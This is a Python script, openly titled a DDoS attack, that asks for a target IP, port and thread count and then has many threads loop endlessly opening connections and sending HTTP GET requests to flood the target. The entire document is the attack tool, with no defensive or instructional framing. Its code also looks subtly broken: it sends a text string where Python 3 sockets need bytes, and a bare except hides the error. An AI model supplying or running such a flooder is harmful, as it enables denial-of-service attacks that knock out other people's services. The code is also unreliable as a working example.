import socket
import threading

# Function to send HTTP GET requests to the target
def ddos(target_ip, target_port):
    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect to the target
            s.connect((target_ip, target_port))
            # Send a simple HTTP GET request
            s.send("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n")
            # Close the connection
            s.close()
            print("Request sent to", target_ip)
        except:
            print("Failed to send request to", target_ip)

# Function to start the DDOS attack
def start_ddos(target_ip, target_port, num_threads):
    # Create and start multiple threads to send requests simultaneously
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target_ip, target_port))
        thread.start()

# Input target IP address, port, and number of threads from the user
while True:
    try:
        target_ip = input("Enter target IP address: ")
        if not target_ip:
            raise ValueError("Target IP address cannot be empty")
        # Attempt to create a socket to validate the IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, 80))
        s.close()
        break  # Break out of the loop if the IP address is valid
    except ValueError as e:
        print(e)
    except Exception as e:
        print("Failed to connect to the target IP:", e)

while True:
    try:
        target_port = int(input("Enter target port: "))
        if target_port <= 0 or target_port > 65535:
            raise ValueError("Invalid port number")
        break
    except ValueError:
        print("Please enter a valid port number")

while True:
    try:
        num_threads = int(input("Enter number of threads: "))
        if num_threads <= 0:
            raise ValueError("Number of threads must be greater than 0")
        break
    except ValueError:
        print("Please enter a valid number of threads")

# Start the DDOS attack
start_ddos(target_ip, target_port, num_threads)
